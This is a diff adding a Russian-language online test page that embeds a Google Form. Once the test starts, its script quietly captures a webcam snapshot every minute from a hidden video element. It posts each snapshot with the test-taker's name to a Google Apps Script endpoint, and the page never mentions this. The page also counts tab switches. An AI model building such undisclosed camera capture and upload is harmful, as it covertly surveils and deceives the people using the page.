@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Тестирование</title>
+    <style>
+        body { font-family: sans-serif; background: #f4f7f6; padding: 20px; }
+        .card { background: white; padding: 20px; border-radius: 10px; max-width: 600px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        iframe { width: 100%; height: 500px; border: none; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; }
+        button { width: 100%; padding: 15px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="card" id="setup">
+        <h2>Регистрация</h2>
+        <input type="text" id="name" placeholder="Введите имя">
+        <button onclick="start()">Начать тест</button>
+    </div>
+
+    <div class="card" id="test" style="display:none;">
+        <video id="video" width="100%" height="auto" autoplay playsinline style="display:none;"></video>
+        <iframe src="https://forms.gle/DJtcEVMVLGwxBjfKA"></iframe>
+        <button onclick="finish()">Завершить</button>
+    </div>
+
+    <script>
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxep4nfsEIKDixNG-edxn-EAFEqXjA688uPu45tZZV_sSFKpy__7npQZH75B2GhmXBExw/exec";
+        let cheatCount = 0;
+        let isTesting = false;
+
+        document.addEventListener("visibilitychange", () => {
+            if (document.hidden && isTesting) { cheatCount++; alert("Нарушение!"); }
+        });
+  
+        async function start() {
+            const name = document.getElementById('name').value;
+            if(!name) return alert("Введите имя");
+            
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('video').srcObject = stream;
+            
+            document.getElementById('setup').style.display = 'none';
+            document.getElementById('test').style.display = 'block';
+            isTesting = true;
+
+            setInterval(async () => {
+                const canvas = document.createElement('canvas');
+                canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0, 320, 240);
+                const image = canvas.toDataURL('image/jpeg', 0.5);
+                await fetch(SCRIPT_URL, { method: 'POST', body: JSON.stringify({ type: 'photo', name: name, image: image }) });
+            }, 60000); // 1 minute
+        }
+
+        function finish() {
+            alert("Тест завершен");
+            location.reload();
+        }
+    </script>
+</body>
+</html>
